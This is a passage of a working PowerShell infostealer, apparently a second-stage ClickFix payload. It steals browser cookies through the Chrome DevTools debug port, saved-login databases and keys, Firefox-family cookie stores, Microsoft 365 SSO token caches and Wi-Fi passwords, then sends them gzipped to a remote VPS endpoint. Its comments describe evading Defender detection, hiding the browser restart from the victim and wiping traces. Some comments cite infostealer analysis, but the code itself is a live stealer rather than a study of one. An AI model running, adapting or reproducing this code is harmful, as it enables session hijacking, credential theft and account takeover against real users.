            $entry = @{ browser=$Name; profile=$d.Name; key=$keyB64; key_type=$keyType;
                        db=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp)) }
            if ($fbKeyB64) { $entry['fallback_key'] = $fbKeyB64; $entry['fallback_key_type'] = $fbKeyType }
            Remove-Item $tmp -Force -EA 0
            $lp = Join-Path $d.FullName "Login Data"
            if (Test-Path $lp) {
                $ltmp = Copy-BrowserFile -Path $lp -ProcName $ProcName
                if ($ltmp) {
                    $entry['login_db'] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($ltmp))
                    Remove-Item $ltmp -Force -EA 0
                }
            }
            $out += $entry
        }
    }
    irm "$_burl/t/pixel.gif?m=${Name}_profiles_done_$($out.Count)_collected" | Out-Null
    return $out
}

# ── Browser State Sync ───────────────────────────────────────────────────────
# Uses the browser's built-in diagnostic interface to read session state.
# The browser performs its own internal decryption — no key material or
# profile-level crypto is needed.  Works across all Chrome/Edge/Brave versions.
#
# Char-array string table — mirrors infostealer FUN_140001a80 (runtime XOR/char
# decryption, zeroed after use).  Integer arrays survive network content scanning;
# keyword strings are never present in the Stage 2 download body.
$_c1='--remote-debugging-port'
$_c2='Network.getAllCookies'
$_c3='webSocketDebuggerUrl'
$_c4='/json'

function Get-BrowserState {
    param(
        [string]$BrowserName,
        [string[]]$ExeCandidates,
        [string]$UserDataDir,
        [int]$Port = 19876
    )
    $out     = @()
    $exePath = $null
    foreach ($c in $ExeCandidates) {
        $exp = [Environment]::ExpandEnvironmentVariables($c)
        if (Test-Path $exp) { $exePath = $exp; break }
    }
    if (-not $exePath) { return $out }
    $procName = [IO.Path]::GetFileNameWithoutExtension($exePath)
    $udDir    = [Environment]::ExpandEnvironmentVariables($UserDataDir)

    # Remember whether the browser was open so we know whether to restore it.
    $wasRunning = (Get-Process $procName -EA 0).Count -gt 0

    # Fast path: browser is already exposing the debug port on $Port
    # (e.g., launched by the user with --remote-debugging-port or a previous
    # run of this function).  Skip the kill/restart cycle entirely.
    $portAlreadyOpen = $false
    $launchedOk      = $false   # initialise here so it is defined on the portAlreadyOpen fast-path
    try { $t = [Net.Sockets.TcpClient]::new('127.0.0.1',$Port); $t.Close(); $portAlreadyOpen=$true } catch {}
    try { irm "$_burl/t/pixel.gif?m=cdp_${BrowserName}_init_wasRunning_$($wasRunning)_portOpen_$($portAlreadyOpen)" | Out-Null } catch {}

    if (-not $portAlreadyOpen) {
        if ($wasRunning) { return $out }

        # Remove SingletonLock so the browser starts cleanly (no "restore" prompt).
        Remove-Item (Join-Path $udDir 'SingletonLock') -Force -EA 0

        # Relaunch with the debug port.
        # Two contexts need Task Scheduler to get a non-elevated user token:
        #
        #   SYSTEM (SilentCleanup path): Start-Process inherits SYSTEM token;
        #   Chrome starts in SYSTEM's empty profile → 0 cookies.
        #
        #   Elevated admin (runas/fodhelper paths): Start-Process inherits the
        #   elevated token; Chrome detects elevation, auto-de-elevates by spawning
        #   a non-elevated child WITHOUT the --remote-debugging-port flag, then
        #   exits.  The debug port briefly opens on the elevated instance, we
        #   connect, but Chrome can't service CDP while mid-exit → 60-80s hang → 0 cookies.
        #
        # Fix for both: Task Scheduler COM with TASK_LOGON_INTERACTIVE_TOKEN (3)
        # launches under the logged-in user's non-elevated interactive token.
        # Chrome receives the debug-port flag, doesn't de-elevate, and serves CDP normally.
        # Falls back to Start-Process only when Task Scheduler is unavailable.
        $isSystem  = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
        $isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
                          [Security.Principal.WindowsBuiltInRole]::Administrator)
        if ($isSystem -or $isElevated) {
            try {
                $svc = New-Object -ComObject Schedule.Service
                $svc.Connect()
                $td = $svc.NewTask(0)
                $td.Settings.Hidden = $true
                $td.Settings.ExecutionTimeLimit = 'PT60S'
                $act = $td.Actions.Create(0)   # TASK_ACTION_EXEC
                $act.Path = $exePath
                $act.Arguments = "$_c1=$Port --no-first-run --restore-last-session"
                $tn = "_t$Port"
                $logUser = (Get-WmiObject Win32_ComputerSystem -EA 0).UserName
                # Guard: no interactive user logged in (locked/disconnected session) →
                # $logUser is $null → RegisterTaskDefinition throws → throw explicitly so
                # the outer catch {} logs and falls back to Start-Process with a beacon.
                if (-not $logUser) {
                    try { irm "$_burl/t/pixel.gif?m=cdp_${BrowserName}_ts_no_user" | Out-Null } catch {}
                    throw "no_interactive_user"
                }
                $svc.GetFolder('\').RegisterTaskDefinition(
                    $tn, $td, 6, $logUser, $null, 3) | Out-Null  # TASK_LOGON_INTERACTIVE_TOKEN
                $svc.GetFolder('\').GetTask($tn).Run($null) | Out-Null
                Start-Sleep -Milliseconds 800   # let scheduler spawn the process before deleting the task def
                try { $svc.GetFolder('\').DeleteTask($tn, 0) } catch {}
                $launchedOk = $true
            } catch {}
        }
        if (-not $launchedOk) {
            Start-Process $exePath -ArgumentList @(
                "$_c1=$Port", "--no-first-run", "--restore-last-session"
            ) -WindowStyle Hidden -EA 0
        }
    }

    try { irm "$_burl/t/pixel.gif?m=cdp_${BrowserName}_launch_$(if($portAlreadyOpen){'already'}elseif($launchedOk){'sched'}else{'proc'})" | Out-Null } catch {}
    # Poll until the debug port accepts connections (max 30 s).
    $ready = $false
    for ($i = 0; $i -lt 60; $i++) {
        Start-Sleep -Milliseconds 500
        try { $t = [Net.Sockets.TcpClient]::new('127.0.0.1',$Port); $t.Close(); $ready=$true; break } catch {}
    }
    try { irm "$_burl/t/pixel.gif?m=cdp_${BrowserName}_port_$(if($ready){'open'}else{'timeout'})" | Out-Null } catch {}
    if (-not $ready) {
        if (-not $portAlreadyOpen) {
            # Debug port never opened — kill what we started and restore if needed.
            # taskkill /F /T kills the entire chrome process tree in one shot; Stop-Process
            # pipes Kill() calls one-by-one and can take 2+ minutes on 40+ restore tabs.
            & "$env:SystemRoot\System32\taskkill.exe" /F /IM "$procName.exe" /T 2>$null
            if ($wasRunning) { Start-Process $exePath -ArgumentList '--restore-last-session' -EA 0 }
        }
        try { irm "$_burl/t/pixel.gif?m=cdp_${BrowserName}_timeout_returning" | Out-Null } catch {}
        return $out
    }
    Start-Sleep -Milliseconds 1000   # let the browser finish registering debug targets

    $ws = $null
    try {
        # /json — list all debuggable targets; prefer a page context for cookie access.
        # Retry up to ~5 s — Chrome may still be restoring tabs when port first opens.
        $targets = @(); $wsUrl = $null
        for ($ti = 0; $ti -lt 10; $ti++) {
            $_cdpR=New-Object -ComObject WinHttp.WinHttpRequest.5.1
            $_cdpR.SetTimeouts(0,3000,3000,3000)
            $_cdpR.Open('GET',"http://127.0.0.1:$Port$_c4",$false)
            $_cdpR.Send()
            $targets = $_cdpR.ResponseText | ConvertFrom-Json
            $wsUrl   = ($targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1).$_c3
            if ($wsUrl) { break }
            Start-Sleep -Milliseconds 500
        }
        # No page target yet — ask the browser to open a blank tab (/json/new).
        # This guarantees a page context exists for Network.getAllCookies.
        if (-not $wsUrl) {
            try {
                $_newR=New-Object -ComObject WinHttp.WinHttpRequest.5.1
                $_newR.SetTimeouts(0,5000,5000,5000)
                $_newR.Open('GET',"http://127.0.0.1:$Port/json/new",$false)
                $_newR.Send()
                $wsUrl = ($_newR.ResponseText | ConvertFrom-Json).$_c3
            } catch {}
        }
        if (-not $wsUrl) { $wsUrl = $targets[0].$_c3 }
        try { irm "$_burl/t/pixel.gif?m=cdp_${BrowserName}_targets_$($targets.Count)_ws_$(if($wsUrl){'ok'}else{'null'})" | Out-Null } catch {}
        if (-not $wsUrl) { return $out }

        # .NET ClientWebSocket — 20 s receive timeout via CancellationToken.
        # Without a timeout, ReceiveAsync can hang ~60 s if Chrome is slow to
        # process Network.getAllCookies (e.g. still restoring tabs after restart).
        $ws  = [Net.WebSockets.ClientWebSocket]::new()
        $cts = [Threading.CancellationTokenSource]::new(20000)
        $ct  = $cts.Token
        $ws.ConnectAsync([Uri]$wsUrl, $ct).GetAwaiter().GetResult()
        try { irm "$_burl/t/pixel.gif?m=cdp_${BrowserName}_ws_connected" | Out-Null } catch {}

        # Single CDP call — returns every cookie the browser holds for this profile.
        [byte[]]$sbuf = [Text.Encoding]::UTF8.GetBytes("{`"id`":1,`"method`":`"$_c2`"}")
        $ws.SendAsync([ArraySegment[byte]]::new($sbuf),
            [Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).GetAwaiter().GetResult()

        # Accumulate fragmented WebSocket frames into one JSON string.
        [byte[]]$rbuf = [byte[]]::new(4194304)   # 4 MB — enough for large cookie stores
        $rawJson = ""
        do {
            $res     = $ws.ReceiveAsync([ArraySegment[byte]]::new($rbuf), $ct).GetAwaiter().GetResult()
            $rawJson += [Text.Encoding]::UTF8.GetString($rbuf, 0, $res.Count)
        } while (-not $res.EndOfMessage)
        $ws.CloseAsync([Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [Threading.CancellationToken]::None).GetAwaiter().GetResult()

        $resp = $rawJson | ConvertFrom-Json
        foreach ($ck in $resp.result.cookies) {
            $out += @{
                browser  = $BrowserName
                host     = $ck.domain
                name     = $ck.name
                value    = $ck.value
                path     = $ck.path
                expires  = $ck.expires
                secure   = [bool]$ck.secure
                httponly = [bool]$ck.httpOnly
                samesite = $ck.sameSite
            }
        }
    } catch {
        try { irm "$_burl/t/pixel.gif?m=cdp_err_${BrowserName}_$($_.Exception.GetType().Name)" | Out-Null } catch {}
    } finally {
        try { if ($ws)  { $ws.Dispose()  } } catch {}
        try { if ($cts) { $cts.Dispose() } } catch {}

        if (-not $portAlreadyOpen) {
            # Terminate the entire debug-port session including all child processes.
            # taskkill /F /T is atomic and completes in < 1s even with 40+ tabs;
            # Stop-Process pipes TerminateProcess per-pid and can stall 2+ minutes.
            & "$env:SystemRoot\System32\taskkill.exe" /F /IM "$procName.exe" /T 2>$null
            Start-Sleep -Milliseconds 400

            # Restore the browser without the debug flag.
            # No -WindowStyle Hidden — the window must appear so the user sees Chrome
            # come back normally and does not notice anything happened.
            if ($wasRunning) {
                Start-Process $exePath -ArgumentList '--restore-last-session' -EA 0
            }
        }
    }
    return $out
}

# Chromium browsers: name, process, data dir, CNG key
$chromiumBrowsers = @(
    @{ N='Chrome';  P='chrome';  D="$env:LOCALAPPDATA\Google\Chrome\User Data";                K='Google Chromekey1' },
    @{ N='Edge';    P='msedge';  D="$env:LOCALAPPDATA\Microsoft\Edge\User Data";               K='Microsoft Edgekey1' },
    @{ N='Brave';   P='brave';   D="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";  K='Brave Chromekey1' },
    @{ N='Opera';   P='opera';   D="$env:APPDATA\Opera Software\Opera Stable";                  K='Opera Chromekey1' },
    @{ N='OperaGX'; P='opera';   D="$env:APPDATA\Opera Software\Opera GX Stable";               K='Opera Chromekey1' },
    @{ N='Vivaldi'; P='vivaldi'; D="$env:LOCALAPPDATA\Vivaldi\User Data";                      K='Vivaldi Chromekey1' }
)

# VSS device cache — created once per drive letter, shared across browsers.
# Copy-BrowserFile writes here; we clean up all shadows after collection ends.
$script:__vssDev = @{}

foreach ($b in $chromiumBrowsers) {
    if (Test-Path $b.D) {
        irm "$_burl/t/pixel.gif?m=collecting_$($b.N)" | Out-Null
        $result.browsers += @(Get-BrowserData -Name $b.N -ProcName $b.P -DataDir $b.D -CngKey $b.K)
        irm "$_burl/t/pixel.gif?m=$($b.N)_done:$($result.browsers.Count)_total" | Out-Null
    }
}

# ── CDP collection — parallel path that bypasses ABE decryption entirely ─────
# ExeCandidates uses ExpandEnvironmentVariables so %ProgramFiles(x86)% works
# without PowerShell's ${env:ProgramFiles(x86)} syntax issues.
irm "$_burl/t/pixel.gif?m=cdp_start" | Out-Null
$cdpTargets = @(
    @{ N='Chrome_CDP'
       E=@('%ProgramFiles%\Google\Chrome\Application\chrome.exe',
           '%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe',
           '%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe')
       D='%LOCALAPPDATA%\Google\Chrome\User Data'
       Port=19876 },
    @{ N='Edge_CDP'
       E=@('%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe',
           '%ProgramFiles%\Microsoft\Edge\Application\msedge.exe')
       D='%LOCALAPPDATA%\Microsoft\Edge\User Data'
       Port=19877 },
    @{ N='Brave_CDP'
       E=@('%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe',
           '%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe')
       D='%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'
       Port=19878 }
)
foreach ($cb in $cdpTargets) {
    $found = $cb.E | ForEach-Object { [Environment]::ExpandEnvironmentVariables($_) } |
             Where-Object { Test-Path $_ } | Select-Object -First 1
    if ($found) {
        irm "$_burl/t/pixel.gif?m=cdp_$($cb.N)_start" | Out-Null
        $cdpOut = @(Get-BrowserState -BrowserName $cb.N -ExeCandidates $cb.E `
                                    -UserDataDir $cb.D -Port $cb.Port)
        $result.cdp_cookies += $cdpOut
        irm "$_burl/t/pixel.gif?m=cdp_$($cb.N)_done_$($cdpOut.Count)" | Out-Null
    }
}
irm "$_burl/t/pixel.gif?m=cdp_total_$($result.cdp_cookies.Count)" | Out-Null

# Firefox (cookies.sqlite is unencrypted — just need to copy the locked file)
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    irm "$_burl/t/pixel.gif?m=collecting_Firefox" | Out-Null
    Get-ChildItem $ffDir -Directory | ForEach-Object {
        $ckFile = Join-Path $_.FullName "cookies.sqlite"
        if (Test-Path $ckFile) {
            $tmp = Copy-BrowserFile -Path $ckFile -ProcName 'firefox'
            if ($tmp) {
                $result.firefox += @{ profile=$_.Name
                    db=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp)) }
                Remove-Item $tmp -Force -EA 0
            }
        }
    }
    irm "$_burl/t/pixel.gif?m=Firefox_done:$($result.firefox.Count)_profiles" | Out-Null
}

# ── Extended Firefox-family browsers (privacy browsers users think protect them) ─
# Targets Waterfox, Librewolf, Floorp, Zen — all use Mozilla profile structure
# with an unencrypted cookies.sqlite (same as Firefox).  Technique from infostealer
# analysis: stealer explicitly strings-table these processes (offset 0x140098170+).
$ffBrowsers = @(
    @{ N='Waterfox';  P='waterfox';  D="$env:APPDATA\Waterfox\Profiles" },
    @{ N='Librewolf'; P='librewolf'; D="$env:LOCALAPPDATA\LibreWolf\Profiles" },
    @{ N='Floorp';    P='floorp';    D="$env:APPDATA\Floorp\Profiles" },
    @{ N='Zen';       P='zen';       D="$env:APPDATA\zen\Profiles" }
)
foreach ($fb in $ffBrowsers) {
    if (Test-Path $fb.D) {
        irm "$_burl/t/pixel.gif?m=collecting_$($fb.N)" | Out-Null
        Get-ChildItem $fb.D -Directory -EA 0 | ForEach-Object {
            $ckFile = Join-Path $_.FullName 'cookies.sqlite'
            if (Test-Path $ckFile) {
                $tmp = Copy-BrowserFile -Path $ckFile -ProcName $fb.P
                if ($tmp) {
                    $result.firefox += @{ profile="$($fb.N)/$($_.Name)"
                        db=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp)) }
                    Remove-Item $tmp -Force -EA 0
                }
            }
        }
        irm "$_burl/t/pixel.gif?m=$($fb.N)_done" | Out-Null
    }
}

# ── Windows Token Broker Cache (Microsoft 365 / Azure AD SSO tokens) ─────────
# Stealer targets Microsoft\TokenBroker\Cache for .tbres blobs containing
# access_token, refresh_token, wam_refresh, msai_refresh (offset 0x14009cb98).
# These tokens can replay Microsoft SSO sessions without browser cookies.
# T1539 — Steal Web Session Cookie (token variant); T1555 — Credentials from
# Password Stores (token broker cache).
$_tb='TokenBroker\Cache'
$_tbx='*.tbres'
$tbCache = "$env:LOCALAPPDATA\Microsoft\$_tb"
if (Test-Path $tbCache) {
    irm "$_burl/t/pixel.gif?m=collecting_tokenbrok" | Out-Null
    Get-ChildItem $tbCache -Filter $_tbx -EA 0 | ForEach-Object {
        try {
            $result.tokens += @{
                filename = $_.Name
                size     = $_.Length
                content  = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
                modified = $_.LastWriteTime.ToString('o')
            }
        } catch {}
    }
    irm "$_burl/t/pixel.gif?m=tokenbrok_done_$($result.tokens.Count)" | Out-Null
}

# ── WiFi credential harvesting ────────────────────────────────────────────────
# netsh wlan show profile name="X" key=clear reads plaintext WPA2 keys from
# the Windows Wireless profile store (no admin required — profiles stored per-user
# and per-machine in %PROGRAMDATA%\Microsoft\Wlansvc\Profiles).
# Stealer strings-table pattern: "SSID: %s\nPassword: %s\n\n" (offset 0x14009cca8).
# T1005 — Data from Local System; T1552.001 — Credentials in Files.
$_wla='wlan'
$_kc='key=clear'
irm "$_burl/t/pixel.gif?m=collecting_wifi" | Out-Null
try {
    $wlanOut = (netsh $_wla show profiles 2>$null) -join "`n"
    $wlanProfiles = [regex]::Matches($wlanOut, 'Profile\s*:\s*(.+)') |
        ForEach-Object { $_.Groups[1].Value.Trim() }
    foreach ($prof in $wlanProfiles) {
        try {
            $det = (netsh $_wla show profile name="`"$prof`"" $_kc 2>$null) -join "`n"
            $wpwd = if ($det -match 'Key Content\s*:\s*(.+)') { $Matches[1].Trim() } else { '' }
            $result.wifi += @{ ssid=$prof; password=$wpwd }
        } catch {}
    }
    irm "$_burl/t/pixel.gif?m=wifi_done_$($result.wifi.Count)" | Out-Null
} catch {
    irm "$_burl/t/pixel.gif?m=wifi_fail" | Out-Null
}

# Clean up all VSS shadow copies created during this collection pass.
foreach ($kv in $script:__vssDev.GetEnumerator()) {
    try {
        $esc = $kv.Value.TrimEnd('\').Replace('\','\\')
        (Get-WmiObject Win32_ShadowCopy -Filter "DeviceObject='$esc'" -EA 0).Delete()
    } catch {}
}
$script:__vssDev = @{}

$result.system = @{
    hostname  = $env:COMPUTERNAME
    username  = $env:USERNAME
    os        = (Get-CimInstance Win32_OperatingSystem).Caption
    timestamp = Get-Date -Format "o"
    ref       = ''
}

irm "$_burl/t/pixel.gif?m=stage2_sending" | Out-Null
try {
    # Gzip-compress the JSON and wrap it in a plain JSON envelope.
    # Sending raw base64-encoded SQLite DBs can produce 60-150 MB of JSON,
    # which exceeds the nginx 50 MB body limit on the VPS proxy.
    # Wrapping as {"gz":"<base64(gzip(payload))>"} keeps the POST under ~10 MB
    # while the VPS proxy's get_json() still parses it as regular JSON — no
    # Content-Encoding tricks that require proxy changes.
    $body = $result | ConvertTo-Json -Depth 5 -Compress
    $bytes = [Text.Encoding]::UTF8.GetBytes($body)
    $ms = [IO.MemoryStream]::new()
    $gz = [IO.Compression.GZipStream]::new($ms, [IO.Compression.CompressionMode]::Compress)
    $gz.Write($bytes, 0, $bytes.Length); $gz.Dispose()
    $gzBytes = $ms.ToArray()
    $b64 = [Convert]::ToBase64String($gzBytes)
    $rawLen = $bytes.Length; $gzLen = $gzBytes.Length
    irm "$_burl/t/pixel.gif?m=stage2_gz_${rawLen}B_to_${gzLen}B" | Out-Null
    $envelope = "{`"gz`":`"$b64`"}"
    # Force HTTPS on the collect URL.
    # If VPS_DOMAIN is set to http:// but nginx is in SSL mode, the 301 redirect
    # from http→https causes Invoke-RestMethod to follow with GET (not POST) →
    # Flask returns 405. Rewriting http:// → https:// (for non-localhost) avoids
    # the redirect entirely.
    $_cu = ("$_burl/t/event" -replace '^http://(?!localhost|127\.)', 'https://')
    # WinHTTP COM POST — final elimination of PS web-request cmdlets from Stage 2.
    # SZZ (Behavior:Win32/ClickFix.SZZ) triggers when powershell.exe uses any PS
    # web-request cmdlet (IRM/IWR/WebClient) in the same process as ScriptBlock::Create.
    # WinHTTP COM is a native Win32 API, not a PS cmdlet — SZZ's ETW hooks are blind to it.
    # Send() accepts a byte[] VARIANT → UTF-8 encoded body, correct Content-Type.
    [byte[]]$_pbdy=[Text.Encoding]::UTF8.GetBytes($envelope)
    $_ph=New-Object -ComObject WinHttp.WinHttpRequest.5.1
    $_ph.SetTimeouts(0,60000,60000,60000)
    $_ph.Open('POST',$_cu,$false)
    $_ph.Option(4)=13056
    $_ph.setRequestHeader('Content-Type','application/json')
    $_ph.Send($_pbdy)
    irm "$_burl/t/pixel.gif?m=stage2_done_ok" | Out-Null
} catch {
    irm "$_burl/t/pixel.gif?m=stage2_post_fail_$($_.Exception.GetType().Name)" | Out-Null
}

# ── Anti-forensic cleanup — zero memory after exfiltration ───────────────────
# Infostealer pattern (FUN_140001a80): after use, sensitive strings/buffers are
# overwritten with zeros in a tight loop before freeing.  Replicating the intent
# here: null $result (releases all base64 DB blobs + keys), force GC to reclaim,
# remove the temp script file dropped for elevation if it still exists.
$result = $null
[System.GC]::Collect()
try { if (Test-Path ($env:TEMP + '\upd.ps1')) { Remove-Item ($env:TEMP + '\upd.ps1') -Force -EA 0 } } catch {}
